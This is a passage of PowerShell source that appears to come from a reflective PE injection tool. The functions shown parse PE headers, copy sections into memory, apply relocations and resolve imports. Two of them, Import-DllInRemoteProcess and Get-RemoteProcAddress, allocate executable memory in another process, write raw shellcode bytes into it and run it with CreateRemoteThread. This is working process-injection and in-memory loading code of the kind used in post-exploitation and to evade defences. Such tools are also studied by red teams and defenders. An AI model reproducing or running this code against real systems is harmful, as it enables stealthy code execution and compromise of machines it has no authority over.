		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
